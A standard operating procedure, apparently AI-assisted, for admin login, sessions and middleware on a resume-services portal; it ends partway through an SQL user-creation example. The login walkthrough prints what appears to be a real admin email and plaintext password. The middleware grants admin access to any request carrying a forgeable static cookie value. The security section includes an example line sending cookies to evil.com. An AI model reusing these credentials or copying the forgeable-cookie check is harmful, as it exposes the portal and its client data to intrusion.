# ADMIN AUTHENTICATION - STANDARD OPERATING PROCEDURE

**Document Version:** 1.0
**Last Updated:** December 22, 2025
**System:** Southwest Resume Services Admin Portal
**Status:** Production Ready
**Model:** Claude Sonnet 4.5 (claude-sonnet-4-5-20250929)

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [System Overview](#system-overview)
3. [Dual-Mode Authentication](#dual-mode-authentication)
4. [Authentication Architecture](#authentication-architecture)
5. [Cookie Flow Diagram](#cookie-flow-diagram)
6. [Middleware Protection Mechanism](#middleware-protection-mechanism)
7. [Session Management Lifecycle](#session-management-lifecycle)
8. [Security Considerations](#security-considerations)
9. [Step-by-Step Login Process](#step-by-step-login-process)
10. [Step-by-Step Logout Process](#step-by-step-logout-process)
11. [Admin User Management](#admin-user-management)
12. [Troubleshooting Guide](#troubleshooting-guide)
13. [Related Documentation](#related-documentation)

---

## Executive Summary

The Southwest Resume Services admin authentication system is a **two-tier authentication architecture** that separates admin access (email/password) from client access (token-based URLs). This SOP covers the admin authentication system built with Supabase Auth, HTTP-only cookies, and Next.js middleware protection.

**Key Features:**
- Supabase Auth for secure email/password authentication
- HTTP-only cookies for session management (JavaScript cannot access)
- Middleware-based route protection (all `/admin` routes require authentication)
- 7-day session duration with 30-day refresh token
- Role-based permissions (super_admin, admin, viewer)
- Security audit logging for all authentication events
- SEO blocking (noindex headers) on all admin pages

**Authentication Flow Summary:**
1. User visits `/admin` without authentication → Middleware redirects to `/admin/login`
2. User enters credentials → API validates with Supabase → Sets HTTP-only cookies
3. User redirected to `/admin` → Middleware checks cookies → Access granted
4. Session expires after 7 days → User must re-authenticate

---

## System Overview

### What is the Admin Authentication System?

The admin authentication system controls access to the `/admin` dashboard where authorized users can:
- View all client questionnaire responses
- Export questionnaire data to CSV
- Manage client access tokens
- View security audit logs
- Configure system settings

### Who Can Access the Admin Portal?

Access is restricted to users in the `admin_users` table with an active status. There are three permission levels:

1. **Super Admin** - Full access to all features (view, edit, delete, manage users)
2. **Admin** - Can view and edit questionnaires and clients (cannot delete or manage users)
3. **Viewer** - Read-only access (can view questionnaires and clients)

### How is Authentication Different from Client Access?

| Aspect | Admin Authentication | Client Authentication |
|--------|---------------------|----------------------|
| **Method** | Email + Password | Token-based URL |
| **Purpose** | Access admin dashboard | Complete questionnaires |
| **Session** | 7 days (refresh: 30 days) | 30 days from link creation |
| **Credential** | ryan.zimmerman@southwestresumes.com | `/q/{32-char-token}` |
| **Revocation** | Change password | Admin revokes token |
| **Storage** | HTTP-only cookies | URL token + Supabase validation |

---

## Dual-Mode Authentication

### Overview

The admin authentication system supports TWO authentication modes to provide flexibility during development and deployment. This dual-mode approach allows for gradual migration from simple authentication to full Supabase integration.

**Mode 1: Simple Session Authentication (Development/Testing)**
- Environment variable-based credentials
- Simple session cookie (admin_session)
- Fast setup for local development
- No external dependencies

**Mode 2: Supabase Authentication (Production-Ready)**
- Full Supabase Auth integration
- JWT-based access and refresh tokens
- Database-backed user management
- Role-based access control (RBAC)

### How Dual-Mode Works

The middleware checks for EITHER authentication method and grants access if ANY valid authentication is found:

```typescript
// From prototype/middleware.ts (lines 26-42)
const adminSession = request.cookies.get('admin_session')?.value;
const supabaseAccess = request.cookies.get('sb-access-token')?.value;
const supabaseRefresh = request.cookies.get('sb-refresh-token')?.value;

// Allow access if EITHER authentication method is present
const isAuthenticated = adminSession === 'authenticated' || (supabaseAccess && supabaseRefresh);

if (!isAuthenticated) {
  // Redirect to login if no valid authentication found
  const loginUrl = new URL('/admin/login', request.url);
  return NextResponse.redirect(loginUrl);
}
```

### Authentication Mode Comparison

| Feature | Simple Session | Supabase Auth |
|---------|---------------|---------------|
| **Setup Complexity** | Low (env vars only) | Medium (Supabase project required) |
| **Credentials** | ADMIN_EMAIL, ADMIN_PASSWORD | auth.users + admin_users table |
| **Session Storage** | Single cookie (admin_session) | Two cookies (sb-access-token, sb-refresh-token) |
| **Token Type** | Static string | JWT (cryptographically signed) |
| **Expiration** | 8 hours (28800 seconds) | 7 days access, 30 days refresh |
| **User Management** | Single admin user | Multiple users with roles |
| **Password Reset** | Manual env var change | Email-based reset flow |
| **Audit Logging** | Rate limiting only | Full security audit log |
| **Production Ready** | No (testing only) | Yes (enterprise-grade) |

### Mode 1: Simple Session Authentication

**Configuration:**
```bash
# .env.local
ADMIN_EMAIL=admin@southwestresumeservices.com
ADMIN_PASSWORD=admin123  # Change in production
```

**Login Flow:**
1. User submits email/password to `/api/admin/auth/login`
2. API validates against `ADMIN_EMAIL` and `ADMIN_PASSWORD` env vars
3. On success, sets `admin_session=authenticated` cookie
4. Cookie attributes: `HttpOnly`, `Secure`, `SameSite=Strict`, `Max-Age=28800` (8 hours)
5. Middleware checks for `admin_session` cookie and allows access

**When to Use:**
- Local development
- Quick testing
- CI/CD environments
- Demo environments

**Limitations:**
- Single user only
- No role-based permissions
- No password reset functionality
- Static credentials (security risk if leaked)
- Shorter session duration

### Mode 2: Supabase Authentication

**Configuration:**
```bash
# .env.local
NEXT_PUBLIC_SUPABASE_URL=https://aougseszcvzgxwniossn.supabase.co
NEXT_PUBLIC_SUPABASE_ANON_KEY=eyJhbGc...
SUPABASE_SERVICE_ROLE_KEY=eyJhbGc...  # Keep secret!
```

**Login Flow:**
1. User submits email/password to login endpoint
2. API calls `supabase.auth.signInWithPassword()`
3. Supabase validates credentials against `auth.users` table
4. Supabase checks `admin_users` table for active status
5. On success, sets TWO cookies: `sb-access-token` and `sb-refresh-token`
6. Middleware checks for both Supabase cookies and allows access

**When to Use:**
- Production deployments
- Staging environments
- Multi-user admin teams
- When role-based permissions are needed
- When password reset functionality is required

**Advantages:**
- Multiple admin users with different roles
- JWT-based security (cryptographically signed)
- Automatic token refresh (30-day sessions)
- Database-backed user management
- Security audit logging
- Password reset via email
- Better scalability

### Cookie Comparison

**Simple Session Cookie:**
```
Set-Cookie: admin_session=authenticated; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=28800
```

**Supabase Cookies:**
```
Set-Cookie: sb-access-token={JWT_TOKEN}; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=604800
Set-Cookie: sb-refresh-token={REFRESH_TOKEN}; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=2592000
```

### Migration Path

**Step 1: Start with Simple Authentication**
```bash
# Quick setup for development
echo "ADMIN_EMAIL=admin@example.com" >> .env.local
echo "ADMIN_PASSWORD=your-secure-password" >> .env.local
npm run dev
```

**Step 2: Set Up Supabase (When Ready)**
```bash
# Create Supabase project
# Run migration: supabase/migrations/20251221_create_admin_users.sql
# Add Supabase env vars
echo "NEXT_PUBLIC_SUPABASE_URL=https://your-project.supabase.co" >> .env.local
echo "NEXT_PUBLIC_SUPABASE_ANON_KEY=your-anon-key" >> .env.local
echo "SUPABASE_SERVICE_ROLE_KEY=your-service-key" >> .env.local
```

**Step 3: Test Both Modes**
```bash
# Both authentication modes work simultaneously
# Simple session for quick testing
# Supabase auth for production-like testing
```

**Step 4: Deploy to Production**
```bash
# Use Supabase authentication in production
# Remove ADMIN_PASSWORD from production env vars
# Keep simple auth for development only
```

### Troubleshooting Dual-Mode Issues

#### Issue: Redirect Loop After Login

**Symptoms:**
- Login succeeds but immediately redirects back to login page
- Infinite loop between `/admin` and `/admin/login`

**Possible Causes:**
1. Cookie not being set correctly
2. Middleware not reading cookie
3. Cookie domain/path mismatch

**Diagnostic Steps:**
```javascript
// Open DevTools → Application → Cookies
// Check for either:
//   - admin_session=authenticated (simple mode)
//   - sb-access-token AND sb-refresh-token (Supabase mode)

// Check middleware logs
// Should see: "Authenticated via simple session" OR "Authenticated via Supabase"
```

**Solutions:**

**If admin_session cookie missing:**
```typescript
// Check app/api/admin/auth/login/route.ts
// Verify Set-Cookie header is being sent:
headers: {
  'Set-Cookie': 'admin_session=authenticated; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=28800',
}
```

**If Supabase cookies missing:**
```typescript
// Check lib/auth/admin-auth.ts
// Verify cookieStore.set() is being called:
cookieStore.set('sb-access-token', token, { /* options */ });
cookieStore.set('sb-refresh-token', refreshToken, { /* options */ });
```

**If cookies present but middleware not detecting:**
```typescript
// Add logging to prototype/middleware.ts
console.log('Admin session:', request.cookies.get('admin_session')?.value);
console.log('Supabase access:', request.cookies.get('sb-access-token')?.value);
console.log('Supabase refresh:', request.cookies.get('sb-refresh-token')?.value);
console.log('Is authenticated:', isAuthenticated);
```

#### Issue: Which Auth Mode Am I Using?

**Check Active Authentication Mode:**
```bash
# Method 1: Browser DevTools
# Open DevTools → Application → Cookies
# If you see "admin_session" → Simple mode
# If you see "sb-access-token" and "sb-refresh-token" → Supabase mode

# Method 2: Environment Variables
# Check .env.local
# If ADMIN_PASSWORD is set → Simple mode available
# If SUPABASE_SERVICE_ROLE_KEY is set → Supabase mode available
```

#### Issue: Session Expires Too Quickly

**Simple Mode:**
- Session duration: 8 hours (28800 seconds)
- To extend, modify `Max-Age` in login route:
  ```typescript
  'Set-Cookie': 'admin_session=authenticated; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=86400', // 24 hours
  ```

**Supabase Mode:**
- Access token: 7 days
- Refresh token: 30 days
- Auto-refresh handles most cases
- To modify, change Supabase JWT expiry in dashboard

#### Issue: Both Auth Modes Active, Which Takes Priority?

**Answer:** BOTH are checked, and access is granted if EITHER is valid.

**Example Scenarios:**

**Scenario 1: Only Simple Session**
```
Cookies: admin_session=authenticated
Result: Access granted (simple mode)
```

**Scenario 2: Only Supabase Tokens**
```
Cookies: sb-access-token=JWT, sb-refresh-token=REFRESH
Result: Access granted (Supabase mode)
```

**Scenario 3: Both Present**
```
Cookies: admin_session=authenticated, sb-access-token=JWT, sb-refresh-token=REFRESH
Result: Access granted (both modes valid)
```

**Scenario 4: Neither Present**
```
Cookies: (empty)
Result: Redirect to /admin/login
```

**Recommendation:** Use ONE mode at a time to avoid confusion. Clear all admin cookies when switching modes:
```javascript
// DevTools → Application → Cookies → Right-click → Delete all cookies
```

---

## Authentication Architecture

### High-Level Architecture Diagram

```
┌─────────────────────────────────────────────────────────────────────┐
│                         CLIENT BROWSER                              │
│                                                                     │
│  1. User navigates to /admin                                        │
│     ↓                                                               │
│  2. Middleware checks for cookies (sb-access-token, sb-refresh-token)│
│     ↓                                                               │
│  3. If missing → Redirect to /admin/login                          │
│     ↓                                                               │
│  4. User submits credentials (email, password)                      │
│     ↓                                                               │
│  5. POST /api/admin/auth/login                                      │
└─────────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────────┐
│                      NEXT.JS API ROUTE                              │
│                  /app/api/admin/auth/login/route.ts                 │
│                                                                     │
│  6. Rate limit check (5 attempts per 15 min per IP)                │
│     ↓                                                               │
│  7. Validate credentials with Supabase Auth                         │
│     ↓                                                               │
│  8. If valid → Create session with Supabase                         │
│     ↓                                                               │
│  9. Set HTTP-only cookies (access + refresh tokens)                 │
│     ↓                                                               │
│ 10. Return success response                                         │
└─────────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────────┐
│                         SUPABASE AUTH                               │
│                                                                     │
│ 11. Verify credentials against auth.users table                     │
│     ↓                                                               │
│ 12. Check admin_users table (active = true)                         │
│     ↓                                                               │
│ 13. Generate access token (JWT, expires 7 days)                     │
│     ↓                                                               │
│ 14. Generate refresh token (expires 30 days)                        │
│     ↓                                                               │
│ 15. Return session data                                             │
└─────────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────────┐
│                         CLIENT BROWSER                              │
│                                                                     │
│ 16. Cookies stored in browser (HTTP-only, Secure, SameSite)        │
│     ↓                                                               │
│ 17. Browser redirects to /admin                                     │
│     ↓                                                               │
│ 18. Middleware validates cookies → Access granted                   │
│     ↓                                                               │
│ 19. Admin dashboard loads with user data                            │
└─────────────────────────────────────────────────────────────────────┘
```

### Technology Stack

**Frontend:**
- Next.js 15 (App Router with React Server Components)
- TypeScript (strict mode)
- Client-side login form with error handling

**Backend:**
- Next.js API Routes (server-side authentication)
- Supabase Auth (user authentication and session management)
- Supabase Database (admin_users table with role-based permissions)

**Security:**
- HTTP-only cookies (JavaScript cannot access)
- Secure cookies (HTTPS only in production)
- SameSite=Lax (CSRF protection)
- Rate limiting (5 attempts per 15 minutes per IP)
- Middleware-based route protection

---

## Cookie Flow Diagram

### Cookie Structure and Attributes

When a user successfully authenticates, cookies are set based on the authentication mode being used:

#### Simple Session Mode

When using simple session authentication, ONE cookie is set:

**Session Cookie (`admin_session`)**

```
Set-Cookie: admin_session=authenticated; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=28800
```

**Attributes:**
- `HttpOnly` - Cannot be accessed by JavaScript (XSS protection)
- `Secure` - Only sent over HTTPS (production mode)
- `SameSite=Strict` - Enhanced CSRF protection (no cross-site requests)
- `Max-Age=28800` - 8 hours (60 * 60 * 8 seconds)
- `Path=/` - Available on all routes

**Purpose:** Simple session validation via static string value

#### Supabase Mode

When using Supabase authentication, TWO cookies are set:

#### 1. Access Token Cookie (`sb-access-token`)

```
Set-Cookie: sb-access-token={JWT_TOKEN}; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=604800
```

**Attributes:**
- `HttpOnly` - Cannot be accessed by JavaScript (XSS protection)
- `Secure` - Only sent over HTTPS (production mode)
- `SameSite=Lax` - CSRF protection (cookie only sent on same-site requests)
- `Max-Age=604800` - 7 days (60 * 60 * 24 * 7 seconds)
- `Path=/` - Available on all routes

**Purpose:** Used for API authentication and session validation

#### 2. Refresh Token Cookie (`sb-refresh-token`)

```
Set-Cookie: sb-refresh-token={REFRESH_TOKEN}; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=2592000
```

**Attributes:**
- Same as access token but with `Max-Age=2592000` (30 days)

**Purpose:** Used to obtain new access tokens when the current one expires

### Cookie Lifecycle Flowchart

```
┌─────────────────────────────────────────────────────────────────────┐
│                       INITIAL LOGIN                                 │
│                                                                     │
│  User submits credentials                                           │
│         ↓                                                           │
│  API validates with Supabase                                        │
│         ↓                                                           │
│  Supabase returns session (access + refresh tokens)                 │
│         ↓                                                           │
│  API sets two HTTP-only cookies:                                    │
│    - sb-access-token (7 days)                                       │
│    - sb-refresh-token (30 days)                                     │
│         ↓                                                           │
│  Cookies sent with every request to /admin                          │
└─────────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────────┐
│                   SUBSEQUENT REQUESTS                               │
│                                                                     │
│  User navigates to /admin/questionnaires                            │
│         ↓                                                           │
│  Browser automatically includes cookies                             │
│         ↓                                                           │
│  Middleware reads sb-access-token and sb-refresh-token              │
│         ↓                                                           │
│  Validates session with Supabase                                    │
│         ↓                                                           │
│  ┌─────────────────────────────────────────────┐                   │
│  │  If valid → Allow access                    │                   │
│  │  If expired → Auto-refresh using refresh token                  │
│  │  If both expired → Redirect to login        │                   │
│  └─────────────────────────────────────────────┘                   │
└─────────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────────┐
│                      AUTO-REFRESH                                   │
│                                                                     │
│  Access token expired (after 7 days)                                │
│         ↓                                                           │
│  Supabase client checks refresh token                               │
│         ↓                                                           │
│  If refresh token valid (within 30 days):                           │
│    - Supabase generates new access token                            │
│    - Updates sb-access-token cookie                                 │
│    - User continues without interruption                            │
│         ↓                                                           │
│  If refresh token expired (after 30 days):                          │
│    - Session terminated                                             │
│    - User redirected to /admin/login                                │
└─────────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────────┐
│                        LOGOUT                                       │
│                                                                     │
│  User clicks "Sign Out"                                             │
│         ↓                                                           │
│  API calls Supabase signOut()                                       │
│         ↓                                                           │
│  Cookies deleted:                                                   │
│    - cookieStore.delete('sb-access-token')                          │
│    - cookieStore.delete('sb-refresh-token')                         │
│         ↓                                                           │
│  User redirected to /admin/login                                    │
└─────────────────────────────────────────────────────────────────────┘
```

### Cookie Storage Location

**Client-side (Browser):**
- Cookies stored in browser's cookie jar
- Not accessible to JavaScript due to `HttpOnly` flag
- Automatically included in all requests to the domain
- Visible in browser DevTools → Application → Cookies

**Server-side (Next.js):**
- Accessed via `cookies()` from `next/headers`
- Read in middleware, API routes, and Server Components
- Cannot be modified by client-side JavaScript

---

## Middleware Protection Mechanism

### What is Middleware?

Next.js middleware runs **before** a request is completed. It allows you to:
- Check authentication before rendering pages
- Redirect unauthenticated users
- Add security headers
- Block search engine indexing

**File:** `/middleware.ts`

### How Middleware Protects Admin Routes

```typescript
// Simplified version of middleware logic
export function middleware(request: NextRequest) {
  const pathname = request.nextUrl.pathname;

  // ============================================================
  // STEP 1: Check if route is /admin
  // ============================================================
  if (pathname.startsWith('/admin')) {

    // ========================================================
    // STEP 2: Allow login page without authentication
    // ========================================================
    if (pathname === '/admin/login' || pathname === '/admin/login/rate-limited') {
      const response = NextResponse.next();

      // Add security headers (prevent clickjacking, XSS)
      response.headers.set('X-Frame-Options', 'DENY');
      response.headers.set('X-Content-Type-Options', 'nosniff');
      response.headers.set('X-Robots-Tag', 'noindex, nofollow');

      return response;
    }

    // ========================================================
    // STEP 3: Check for authentication cookies
    // ========================================================
    const accessToken = request.cookies.get('sb-access-token');
    const refreshToken = request.cookies.get('sb-refresh-token');

    // ========================================================
    // STEP 4: If no cookies, redirect to login
    // ========================================================
    if (!accessToken || !refreshToken) {
      const loginUrl = new URL('/admin/login', request.url);
      return NextResponse.redirect(loginUrl);
    }

    // ========================================================
    // STEP 5: Cookies present, add security headers and allow
    // ========================================================
    // Note: Full session validation happens in layout via getAdminUser()
    // Middleware only checks cookie presence for performance
    const response = NextResponse.next();

    response.headers.set('X-Frame-Options', 'DENY');
    response.headers.set('X-Content-Type-Options', 'nosniff');
    response.headers.set('X-Robots-Tag', 'noindex, nofollow');

    return response;
  }

  // Not an admin route, continue normally
  return NextResponse.next();
}
```

### Middleware Execution Order

```
1. User requests /admin/questionnaires
        ↓
2. Next.js invokes middleware BEFORE rendering page
        ↓
3. Middleware checks pathname → starts with /admin
        ↓
4. Middleware reads cookies → sb-access-token, sb-refresh-token
        ↓
5. If cookies missing → Redirect to /admin/login (STOP HERE)
        ↓
6. If cookies present → Add security headers, continue to page
        ↓
7. Page loads, layout.tsx runs getAdminUser() for full validation
        ↓
8. If session invalid → layout redirects to /admin/login
        ↓
9. If session valid → Admin dashboard renders
```

### Why Two-Stage Validation?

**Stage 1: Middleware (Cookie Presence Check)**
- Fast, lightweight check
- Prevents unnecessary page renders for unauthenticated users
- Adds security headers on all admin routes

**Stage 2: Layout (Full Session Validation)**
- Validates JWT token with Supabase
- Checks user exists in admin_users table
- Checks user is active (not disabled)
- Checks user role and permissions

This two-stage approach optimizes performance while maintaining security.

---

## Session Management Lifecycle

### Session Creation (Login)

**Timeline:**
```
Time 0: User submits login form
   ↓
Time +50ms: API validates credentials with Supabase
   ↓
Time +100ms: Supabase returns session tokens
   ↓
Time +150ms: API sets HTTP-only cookies
   ↓
Time +200ms: Browser stores cookies
   ↓
Time +250ms: User redirected to /admin
   ↓
Time +300ms: Middleware validates cookies
   ↓
Time +350ms: Admin dashboard loads
```

**Code Flow:**

1. **Frontend submits credentials:**
```typescript
// app/admin/login/page.tsx
const response = await fetch('/api/admin/auth/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ email, password }),
});
```

2. **API validates with Supabase:**
```typescript
// lib/auth/admin-auth.ts
const { data: authData, error: authError } =
  await authClient.auth.signInWithPassword({ email, password });
```

3. **API sets cookies:**
```typescript
// lib/auth/admin-auth.ts
cookieStore.set('sb-access-token', authData.session.access_token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'lax',
  maxAge: 60 * 60 * 24 * 7, // 7 days
  path: '/',
});

cookieStore.set('sb-refresh-token', authData.session.refresh_token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'lax',
  maxAge: 60 * 60 * 24 * 30, // 30 days
  path: '/',
});
```

### Session Validation (Every Request)

**Timeline:**
```
User navigates to /admin/questionnaires
   ↓
Middleware reads cookies (instant)
   ↓
Middleware checks cookie presence (instant)
   ↓
If missing → Redirect to login (STOP)
   ↓
If present → Continue to page
   ↓
Layout runs getAdminUser() (50-100ms)
   ↓
Supabase validates JWT token (50ms)
   ↓
If invalid → Redirect to login (STOP)
   ↓
If valid → Fetch admin_users record (50ms)
   ↓
If not admin or inactive → Redirect to login (STOP)
   ↓
If active admin → Render page with user data
```

**Code Flow:**

```typescript
// app/admin/layout.tsx
const adminUser = await getAdminUser();

// lib/auth/admin-auth.ts
export async function getAdminUser(): Promise<AdminUser | null> {
  // 1. Get session from Supabase using cookies
  const { data: { session }, error } = await authClient.auth.getSession();

  if (error || !session) return null;

  // 2. Validate user exists in admin_users table
  const { data: adminUser, error: adminError } = await adminClient
    .from('admin_users')
    .select('*')
    .eq('user_id', session.user.id)
    .eq('active', true)
    .single();

  if (adminError || !adminUser) return null;

  return adminUser;
}
```

### Session Refresh (Automatic)

**When does refresh happen?**
- Access token expires after 7 days
- Supabase client automatically checks refresh token
- If refresh token valid (within 30 days), new access token issued
- User continues without interruption

**Timeline:**
```
Day 0: User logs in
   ↓
Day 7: Access token expires
   ↓
User navigates to /admin
   ↓
Middleware finds cookies present
   ↓
Layout calls getAdminUser()
   ↓
Supabase detects expired access token
   ↓
Supabase checks refresh token (still valid)
   ↓
Supabase generates new access token
   ↓
Cookies updated automatically
   ↓
Session continues seamlessly
   ↓
Day 30: Refresh token expires
   ↓
User navigates to /admin
   ↓
Both tokens expired → Redirect to login
```

**Code Flow:**

```typescript
// Supabase client handles this automatically
const authClient = createClient(supabaseUrl, supabaseAnonKey, {
  auth: {
    autoRefreshToken: true,  // ← Enables automatic refresh
    persistSession: true,     // ← Persists session in cookies
  },
});
```

### Session Termination (Logout)

**Timeline:**
```
User clicks "Sign Out"
   ↓
Frontend calls signOutAdmin()
   ↓
API calls Supabase signOut() (50ms)
   ↓
API deletes cookies (instant)
   ↓
User redirected to /admin/login
   ↓
All admin routes now inaccessible (cookies missing)
```

**Code Flow:**

```typescript
// lib/auth/admin-auth.ts
export async function signOutAdmin(): Promise<void> {
  // 1. Sign out from Supabase (invalidates tokens server-side)
  const authClient = await createAuthClient();
  if (authClient) {
    await authClient.auth.signOut();
  }

  // 2. Delete cookies (removes client-side tokens)
  const cookieStore = await cookies();
  cookieStore.delete('sb-access-token');
  cookieStore.delete('sb-refresh-token');
}
```

---

## Security Considerations

### 1. HTTP-Only Cookies (XSS Protection)

**What:** Cookies with `HttpOnly` flag cannot be accessed by JavaScript

**Why:** Prevents Cross-Site Scripting (XSS) attacks from stealing session tokens

**Example Attack Prevention:**
```javascript
// Malicious script injected via XSS
console.log(document.cookie);
// Output: "" (empty - HTTP-only cookies not visible)

// Attacker cannot steal session tokens via XSS
fetch('https://evil.com/steal?token=' + document.cookie);
// Fails - no cookies accessible
```

### 2. Secure Cookies (Man-in-the-Middle Protection)

**What:** Cookies with `Secure` flag only sent over HTTPS

**Why:** Prevents Man-in-the-Middle (MITM) attacks intercepting session tokens

**Configuration:**
```typescript
secure: process.env.NODE_ENV === 'production'
// Development: false (http://localhost works)
// Production: true (only https:// receives cookies)
```

### 3. SameSite Cookies (CSRF Protection)

**What:** Cookies with `SameSite=Lax` only sent on same-site requests

**Why:** Prevents Cross-Site Request Forgery (CSRF) attacks

**Example Attack Prevention:**
```html
<!-- Attacker's website (evil.com) -->
<form action="https://southwestresumes.com/api/admin/delete-all" method="POST">
  <input type="submit" value="Click for free prize!">
</form>

<!-- When user clicks submit:
     - Browser would normally send cookies
     - SameSite=Lax prevents cookie from being sent
     - Request fails authentication
     - Attack prevented
-->
```

### 4. Rate Limiting (Brute Force Protection)

**What:** Limits login attempts to 5 per 15 minutes per IP address

**Why:** Prevents brute force password guessing attacks

**Implementation:**
```typescript
// lib/security/rate-limit.ts
const MAX_LOGIN_ATTEMPTS = 5;
const LOGIN_WINDOW_MS = 15 * 60 * 1000; // 15 minutes

const rateLimitKey = `admin_login:${clientIp}`;
const rateLimit = checkRateLimit(rateLimitKey, MAX_LOGIN_ATTEMPTS, LOGIN_WINDOW_MS);

if (!rateLimit.allowed) {
  return NextResponse.json(
    { error: 'Too many login attempts. Please try again later.' },
    { status: 429 }
  );
}
```

**Attack Timeline:**
```
Attempt 1: Failed → 4 attempts remaining
Attempt 2: Failed → 3 attempts remaining
Attempt 3: Failed → 2 attempts remaining
Attempt 4: Failed → 1 attempt remaining
Attempt 5: Failed → 0 attempts remaining
Attempt 6: BLOCKED → "Too many login attempts" (15-minute timeout)
```

### 5. SEO Blocking (Information Disclosure Prevention)

**What:** Multiple layers prevent search engines from indexing admin pages

**Why:** Admin pages contain sensitive business data and should never appear in search results

**Three-Layer Defense:**

```typescript
// Layer 1: robots.txt
// File: public/robots.txt
User-agent: *
Disallow: /admin
Disallow: /admin/*

// Layer 2: Meta tags
// File: app/admin/layout.tsx
export const metadata: Metadata = {
  robots: {
    index: false,
    follow: false,
    nocache: true,
  },
};

// Layer 3: HTTP headers
// File: middleware.ts
response.headers.set('X-Robots-Tag', 'noindex, nofollow');
```

### 6. Security Headers (Additional Protections)

**X-Frame-Options: DENY**
- Prevents admin pages from being embedded in iframes
- Protects against clickjacking attacks

**X-Content-Type-Options: nosniff**
- Prevents MIME-type sniffing attacks
- Forces browser to respect declared content types

**Example:**
```typescript
// middleware.ts
response.headers.set('X-Frame-Options', 'DENY');
response.headers.set('X-Content-Type-Options', 'nosniff');
```

---

## Step-by-Step Login Process

### User Perspective

1. Navigate to `https://southwestresumes.com/admin`
2. Redirected to `https://southwestresumes.com/admin/login`
3. See login form with email and password fields
4. Enter credentials:
   - Email: `ryan.zimmerman@southwestresumes.com`
   - Password: `Welectric9191!`
5. Click "Sign In" button
6. See loading spinner
7. Redirected to `https://southwestresumes.com/admin`
8. Admin dashboard loads with user data

### System Perspective (Detailed)

**Step 1: Navigate to /admin**
```
Browser: GET https://southwestresumes.com/admin
   ↓
Middleware: Check pathname → starts with /admin
   ↓
Middleware: Read cookies → sb-access-token (missing)
   ↓
Middleware: Redirect to /admin/login
   ↓
Browser: Navigates to /admin/login
```

**Step 2: Load Login Page**
```
Browser: GET https://southwestresumes.com/admin/login
   ↓
Middleware: pathname === /admin/login → Allow access
   ↓
Middleware: Add security headers (X-Frame-Options, X-Robots-Tag)
   ↓
Server: Render login page (app/admin/login/page.tsx)
   ↓
Browser: Display login form
```

**Step 3: User Enters Credentials**
```
User types: ryan.zimmerman@southwestresumes.com
User types: Welectric9191!
User clicks: "Sign In"
   ↓
Frontend: Prevent default form submission
   ↓
Frontend: Set loading state (show spinner)
   ↓
Frontend: POST to /api/admin/auth/login
```

**Step 4: API Validates Credentials**
```
API Route: Receive POST request
   ↓
Rate Limiter: Check IP address (192.168.1.1)
   ↓
Rate Limiter: Attempts so far: 0/5 → Allowed
   ↓
API: Extract email and password from body
   ↓
API: Call authenticateAdmin(email, password)
   ↓
Supabase: signInWithPassword(email, password)
   ↓
Supabase: Validate credentials against auth.users
   ↓
Supabase: Check admin_users table (active = true)
   ↓
Supabase: Generate JWT access token (expires 7 days)
   ↓
Supabase: Generate refresh token (expires 30 days)
   ↓
Supabase: Return session data
```

**Step 5: API Sets Cookies**
```
API: Receive session from Supabase
   ↓
API: Set sb-access-token cookie
   - Value: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
   - HttpOnly: true
   - Secure: true (production)
   - SameSite: Lax
   - Max-Age: 604800 (7 days)
   - Path: /
   ↓
API: Set sb-refresh-token cookie
   - Value: v2.local.Tk1A2B3C4D5E6F7G8H9I0J1K2L3M4N5O6P7Q8R9S0...
   - HttpOnly: true
   - Secure: true (production)
   - SameSite: Lax
   - Max-Age: 2592000 (30 days)
   - Path: /
   ↓
API: Clear rate limit for successful login
   ↓
API: Return JSON response: { success: true }
```

**Step 6: Frontend Redirects**
```
Frontend: Receive 200 OK response
   ↓
Frontend: Call router.push('/admin')
   ↓
Frontend: Call router.refresh()
   ↓
Browser: Navigate to /admin
```

**Step 7: Access Admin Dashboard**
```
Browser: GET /admin (with cookies)
   ↓
Middleware: Read cookies → sb-access-token (present)
   ↓
Middleware: Add security headers
   ↓
Middleware: Allow access
   ↓
Layout: Call getAdminUser()
   ↓
Layout: Validate session with Supabase
   ↓
Layout: Fetch admin_users record
   ↓
Layout: Render admin dashboard with user data
   ↓
Browser: Display admin dashboard
```

---

## Step-by-Step Logout Process

### User Perspective

1. Click "Sign Out" button in admin dashboard
2. Brief loading indicator
3. Redirected to login page
4. Cannot access /admin routes anymore

### System Perspective (Detailed)

**Step 1: User Clicks Sign Out**
```
User: Click "Sign Out" button
   ↓
Frontend: Call signOutAdmin()
   ↓
Frontend: Show loading state
```

**Step 2: API Terminates Session**
```
API: signOutAdmin() called
   ↓
Supabase: auth.signOut() - Invalidate session server-side
   ↓
Supabase: Mark tokens as revoked in database
   ↓
API: Delete sb-access-token cookie
   ↓
API: Delete sb-refresh-token cookie
   ↓
Browser: Cookies removed from cookie jar
```

**Step 3: Redirect to Login**
```
Frontend: Receive success response
   ↓
Frontend: router.push('/admin/login')
   ↓
Browser: Navigate to /admin/login
```

**Step 4: Verify Logout**
```
User: Try to navigate to /admin
   ↓
Middleware: Check cookies → Missing
   ↓
Middleware: Redirect to /admin/login
   ↓
Logout confirmed - all admin routes inaccessible
```

---

## Admin User Management

### Creating a New Admin User

**Method 1: Supabase SQL Editor (Recommended)**

1. Navigate to Supabase Dashboard
2. Click "SQL Editor"
3. Run the following SQL:

```sql
-- Step 1: Create Supabase Auth user
INSERT INTO auth.users (
  instance_id,
  id,
  aud,
